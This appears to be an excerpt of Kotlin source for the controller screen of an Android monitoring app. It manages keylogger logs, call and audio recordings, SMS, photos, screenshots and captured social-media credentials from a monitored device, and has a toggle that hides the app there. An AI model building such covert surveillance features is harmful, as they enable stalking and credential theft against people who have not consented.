...
import com.github.sdt.cypher.data.model.Child
import com.github.sdt.cypher.data.preference.DataSharePreference.childSelected
import com.github.sdt.cypher.data.preference.DataSharePreference.clearAll
import com.github.sdt.cypher.data.preference.DataSharePreference.deviceChildSelected
import com.github.sdt.cypher.data.preference.DataSharePreference.finishAppState
import com.github.sdt.cypher.data.preference.DataSharePreference.listChild
import com.github.sdt.cypher.data.preference.DataSharePreference.lockPin
import com.github.sdt.cypher.data.preference.DataSharePreference.lockState
import com.github.sdt.cypher.ui.activities.base.BaseActivity
import com.github.sdt.cypher.ui.activities.lock.LockActivity
import com.github.sdt.cypher.ui.activities.login.LoginActivity
import com.github.sdt.cypher.ui.fragments.base.IOnFragmentListener
...
import com.github.sdt.cypher.ui.fragments.setting.SettingFragment
import com.github.sdt.cypher.ui.fragments.social.SocialFragment
import com.github.sdt.cypher.utils.ConstFun.find
import com.github.sdt.cypher.utils.ConstFun.listToStringChild
import com.github.sdt.cypher.utils.ConstFun.openGallery
import com.github.sdt.cypher.utils.ConstFun.startAnimateActivity
import com.github.sdt.cypher.utils.ConstFun.startMain
import com.github.sdt.cypher.utils.ConstFun.stringToListChild
import com.github.sdt.cypher.utils.Consts.ADDRESS_AUDIO_CALLS
import com.github.sdt.cypher.utils.Consts.ADDRESS_AUDIO_RECORD
import com.github.sdt.cypher.utils.Consts.CALLS
import com.github.sdt.cypher.utils.Consts.CHILD_NAME
import com.github.sdt.cypher.utils.Consts.CHILD_PHOTO
import com.github.sdt.cypher.utils.Consts.CHILD_SHOW_APP
import com.github.sdt.cypher.utils.Consts.CHILD_SOCIAL_MS
import com.github.sdt.cypher.utils.Consts.DATA
import com.github.sdt.cypher.utils.Consts.DEVICE_NAME
import com.github.sdt.cypher.utils.Consts.KEY_LOGGER
import com.github.sdt.cypher.utils.Consts.NOTIFICATION_MESSAGE
import com.github.sdt.cypher.utils.Consts.PHOTO
import com.github.sdt.cypher.utils.Consts.RECORDING
import com.github.sdt.cypher.utils.Consts.SMS
import com.github.sdt.cypher.utils.Consts.SOCIAL
import com.github.sdt.cypher.utils.Consts.TAG
import com.github.sdt.cypher.utils.Dialogs.showDialogAccount
import com.github.sdt.cypher.utils.FileHelper.deleteAllFile
import com.github.sdt.cypher.utils.FileHelper.getUriPath
import com.github.sdt.cypher.utils.HomeWatcher
...
class MainParentActivity : BaseActivity(R.layout.activity_main_parent), InterfaceViewMainParent,
    NavigationView.OnNavigationItemSelectedListener, HomeWatcher.OnHomePressedListener {
    ...
    @Inject
    lateinit var interactorParent: InterfaceInteractorMainParent<InterfaceViewMainParent>
    ...
    override fun onCreate(savedInstanceState: Bundle?) {
        ...
        if (lockState && lockPin != "") {
            startAnimateActivity<LockActivity>(); initializeHomeWatcher()
        }
    ...
    override fun changeChild(fragmentTag: String) {
        ...
        dialog = showDialogAccount(
            stringToListChild(listChild),
            clickChangePhoto = { checkPermissionStorage() }) {
        ...
        getPermissions()!!.requestEachCombined(WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE)
            .subscribe({ permission ->
                subscribePermission(
                    ...
                    getString(R.string.message_permission_never_ask_again_storage)
                ) {
                    openGallery()
                }
    ...
    override fun setMenu(menu: PopupMenu?) {
        menu?.setOnMenuItemClickListener { item ->
            when (item.itemId) {
                ...
                R.id.nav_show_app -> interactorParent.getDatabaseReference("$DATA/$CHILD_SHOW_APP")
                    .setValue(true)
                R.id.nav_hide_app -> interactorParent.getDatabaseReference("$DATA/$CHILD_SHOW_APP")
                    .setValue(false)
                R.id.nav_clear_keylogger -> showDialogClearLogList(
                    R.string.message_dialog_clear_keylogger,
                    "$KEY_LOGGER/$DATA"
                )
                R.id.nav_clear_calls -> showDialogClearLogList(
                    R.string.message_dialog_clear_calls,
                    "$CALLS/$DATA"
                ) { deleteAllFile(ADDRESS_AUDIO_CALLS) }
                R.id.nav_clear_sms -> showDialogClearLogList(
                    R.string.message_dialog_clear_sms,
                    "$SMS/$DATA"
                )
                R.id.nav_clear_photo -> showDialogClearLogList(
                    R.string.message_dialog_clear_photos,
                    "$PHOTO/$DATA"
                )
                R.id.nav_clear_social -> showDialogClearLogList(
                    R.string.message_dialog_clear_credentials,
                    "$SOCIAL/$CHILD_SOCIAL_MS"
                )
                R.id.nav_clear_records -> showDialogClearLogList(
                    R.string.message_dialog_clear_record,
                    "$RECORDING/$DATA"
                ) { deleteAllFile(ADDRESS_AUDIO_RECORD) }
                R.id.nav_clear_notifications -> showDialogClearLogList(
                    R.string.message_dialog_clear_notifications,
    ...
    override fun onNavigationItemSelected(p0: MenuItem): Boolean {
        ...
        when (p0.itemId) {
            ...
            R.id.nav_callhistory -> if (!p0.isChecked) setFragmentTag(FragmentCallhistory.TAG)
            R.id.nav_screenshot -> if (!p0.isChecked) setFragmentTag(FragmentScreenshot.TAG)
    ...
    private fun setFragmentTag(fragmentTag: String) {
        when (fragmentTag) {
            ...
            FragmentCallhistory.TAG -> interactorParent.setFragmentCallhistory()
            FragmentScreenshot.TAG -> interactorParent.setFragmentScreenshot()
